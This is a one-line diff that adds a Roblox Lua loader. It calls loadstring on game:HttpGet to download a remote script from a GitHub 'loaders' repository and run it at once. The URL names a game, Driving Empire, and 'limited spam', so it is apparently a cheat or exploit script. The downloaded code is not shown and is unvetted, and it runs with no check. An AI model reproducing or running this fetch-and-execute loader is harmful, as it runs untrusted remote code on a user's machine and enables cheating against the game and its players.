@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/driving-empire-2-new-limited-spam6-4tv69t2noed84d.lua"))()
